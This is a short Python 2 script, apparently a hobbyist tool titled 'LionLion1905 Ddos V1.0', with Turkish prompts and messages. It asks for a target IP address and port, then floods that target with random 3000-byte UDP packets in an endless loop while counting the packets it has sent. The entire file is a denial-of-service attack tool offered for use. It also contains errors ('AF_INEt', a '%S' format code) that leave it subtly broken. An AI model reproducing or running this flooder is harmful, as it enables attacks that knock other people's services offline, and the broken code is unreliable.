import socket
import random
import os


os.system("clear")
banner="""
##########################
#LionLion1905 Ddos V1.0  #
#Code by LionLion1905    #
##########################


"""
print(banner)

 
hedef_ip=raw_input("hedef ip: ")
hedef_port=input("hedef port: ")


bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INEt,socket.SOCK_DGRAM)


sayac=0
while True:
        sock.sendto(bytes,(hedef_ip,hedef_port))
        sayac=sayac+1
        print("saldiri baslatildi,gonderilen paket:%S"%(sayac))

                 